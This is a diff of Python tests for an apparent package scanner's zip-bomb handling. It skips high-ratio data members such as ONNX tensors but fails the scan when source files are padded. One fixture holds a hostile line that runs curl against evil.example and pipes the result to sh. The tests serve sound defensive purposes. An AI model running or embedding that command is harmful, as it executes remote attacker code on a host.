@@ -62,10 +62,62 @@ def _scan(eco: str, fetched):
 # ── bomb defence: still rejected ─────────────────────────────────────────────────
 
 
-def test_zip_member_with_absurd_ratio_is_rejected():
-    # 4MB of zeros deflates to a few KB: ~1000:1, the classic zip bomb shape. Rejected
-    # before a byte is inflated, even though the member is also over the size cap.
+def test_zip_member_with_absurd_ratio_is_skipped_unread(monkeypatch):
+    # 4MB of zeros deflates to a few KB: ~1000:1. That one member is never inflated
+    # and is recorded as skipped; the rest of the package is still scanned. (onnx
+    # ships all-zero .pb test tensors like this; the whole scan used to fail.)
     raw = _zip([("pkg/__init__.py", b"x = 1\n"), ("pkg/bomb.dat", b"\0" * (4 * 1024 * 1024))])
+    opened: list[str] = []
+    real_open = zipfile.ZipFile.open
+
+    def spy(self, member, *a, **k):
+        opened.append(getattr(member, "filename", member))
+        return real_open(self, member, *a, **k)
+
+    monkeypatch.setattr(zipfile.ZipFile, "open", spy)
+    report = SkipReport()
+    kept = _unpack_zip(raw, report)
+    assert "pkg/__init__.py" in kept and "pkg/bomb.dat" not in kept
+    assert "pkg/bomb.dat" not in opened
+    assert report.reasons.get("implausible compression ratio") == 1
+    assert report.oversized_scannable == 0  # a .dat blob is not source
+
+
+@pytest.mark.parametrize("name", [
+    "pkg/evil.py", "setup.py", "pkg/run.sh",
+    # test / example / doc paths are read by the engine too (review of #442)
+    "pkg/testing/__init__.py", "pkg/examples/x.py", "pkg/tests/test_x.py",
+    "docs/conf.py", "pkg/example_run.py", "pkg/conftest.py",
+])
+def test_source_member_with_absurd_ratio_still_fails_the_scan(name):
+    # Source padded with zeros/newlines would otherwise be skipped and the package
+    # could read Safe with its payload unread (review of #442). Code the engine
+    # reads keeps the old behavior: the scan fails.
+    payload = b"import os\nos.system('curl http://evil.example/x | sh')\n"
+    raw = _zip([("pkg/__init__.py", b"x = 1\n"),
+                (name, payload + b"\n" * (4 * 1024 * 1024))])
+    with pytest.raises(ArtifactFetchError, match="zip bomb"):
+        _unpack_zip(raw)
+
+
+def test_onnx_shaped_wheel_scans_with_its_code():
+    # The production case: all-zero .pb test tensors beside real code.
+    raw = _zip([
+        ("onnx/__init__.py", b"import os\n"),
+        ("onnx/backend/test/data/node/test_conv/test_data_set_0/input_0.pb",
+         b"\0" * (2 * 1024 * 1024)),
+        ("onnx/model.onnx", b"\0" * (2 * 1024 * 1024)),
+    ])
+    report = SkipReport()
+    kept = _unpack_zip(raw, report)
+    assert "onnx/__init__.py" in kept
+    assert report.reasons.get("implausible compression ratio") == 2
+
+
+def test_many_absurd_members_still_hit_the_archive_guards(monkeypatch):
+    # Skipping one member never weakens the archive-wide bomb guards.
+    monkeypatch.setattr(af, "_RATIO_ARCHIVE_FLOOR", 4 * 1024 * 1024)
+    raw = _zip([(f"pkg/z{i}.dat", b"\0" * (2 * 1024 * 1024)) for i in range(4)])
     with pytest.raises(ArtifactFetchError, match="zip bomb"):
         _unpack_zip(raw)
 
